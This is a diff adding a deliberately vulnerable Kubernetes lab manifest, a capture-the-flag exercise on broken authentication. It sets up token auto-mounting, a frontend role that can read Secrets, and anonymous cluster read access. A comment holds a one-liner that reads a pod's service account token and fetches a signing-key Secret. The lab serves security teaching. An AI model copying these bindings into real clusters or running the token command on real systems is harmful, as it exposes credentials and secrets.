@@ -1,0 +1,123 @@
+# K09 — Broken Authentication Mechanisms (VULNERABLE)
+# NimbusMart's storefront/web-frontend pod. Two textbook authentication
+# weaknesses shipped together:
+#   1. The pod runs as the "frontend-sa" service account and never disables
+#      token auto-mounting, so a live API bearer token is written to
+#      /var/run/secrets/kubernetes.io/serviceaccount/token. web-frontend only
+#      serves HTML — it has no reason to talk to the API server at all.
+#   2. frontend-sa was over-granted get/list on Secrets in the storefront
+#      namespace, so that auto-mounted token can read the session signing key.
+#   3. A ClusterRoleBinding also grants system:anonymous / system:unauthenticated
+#      a read-only role, so the API server answers with NO credential at all.
+#
+# Capture the flag (from inside the pod, using the token it never needed):
+#   kubectl exec -it -n storefront web-frontend -- sh -c \
+#     'curl -sk -H "Authorization: Bearer $(cat /var/run/secrets/kubernetes.io/serviceaccount/token)" \
+#      https://kubernetes.default.svc/api/v1/namespaces/storefront/secrets/session-signing-key \
+#      | grep -o "\"flag\":\"[^\"]*\"" | cut -d\" -f4 | base64 -d'
+#
+# DO NOT deploy anything like this outside a throwaway lab cluster.
+apiVersion: v1
+kind: Namespace
+metadata:
+  name: storefront
+  labels:
+    app.kubernetes.io/part-of: nimbusmart
+---
+# The high-value target: the storefront session signing key. The flag stands in
+# for a real HMAC/JWT signing secret that must never leave the API server.
+apiVersion: v1
+kind: Secret
+metadata:
+  name: session-signing-key
+  namespace: storefront
+  labels:
+    owasp: k09
+type: Opaque
+stringData:
+  flag: "FLAG{default_token_talked_to_the_apiserver}"
+---
+apiVersion: v1
+kind: ServiceAccount
+metadata:
+  name: frontend-sa
+  namespace: storefront
+  labels:
+    owasp: k09
+# automountServiceAccountToken is left at its default (true) here.
+---
+# Over-permissive: a *front-end* service account should never read Secrets.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: Role
+metadata:
+  name: secret-reader
+  namespace: storefront
+  labels:
+    owasp: k09
+rules:
+  - apiGroups: [""]
+    resources: ["secrets"]
+    verbs: ["get", "list"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: RoleBinding
+metadata:
+  name: frontend-secret-reader
+  namespace: storefront
+  labels:
+    owasp: k09
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: Role
+  name: secret-reader
+subjects:
+  - kind: ServiceAccount
+    name: frontend-sa
+    namespace: storefront
+---
+apiVersion: v1
+kind: Pod
+metadata:
+  name: web-frontend
+  namespace: storefront
+  labels:
+    app: web-frontend
+    owasp: k09
+spec:
+  serviceAccountName: frontend-sa
+  # automountServiceAccountToken defaults to true -> the token is mounted into
+  # a pod that has no business calling the API server. This is the flaw.
+  containers:
+    - name: web
+      image: curlimages/curl:8.8.0
+      command: ["sh", "-c", "sleep infinity"]
+---
+# Anonymous access, bound to a role — the API server can be read with no token.
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRole
+metadata:
+  name: anon-reader
+  labels:
+    owasp: k09
+rules:
+  - apiGroups: [""]
+    resources: ["pods"]
+    verbs: ["get", "list"]
+---
+apiVersion: rbac.authorization.k8s.io/v1
+kind: ClusterRoleBinding
+metadata:
+  name: anon-reader-binding
+  labels:
+    owasp: k09
+roleRef:
+  apiGroup: rbac.authorization.k8s.io
+  kind: ClusterRole
+  name: anon-reader
+subjects:
+  - apiGroup: rbac.authorization.k8s.io
+    kind: User
+    name: system:anonymous
+  - apiGroup: rbac.authorization.k8s.io
+    kind: Group
+    name: system:unauthenticated
